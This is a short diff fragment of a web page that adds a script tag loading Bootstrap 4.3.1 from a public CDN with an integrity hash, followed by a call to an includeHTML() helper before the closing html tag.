+<script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
+<script>includeHTML()</script></html>
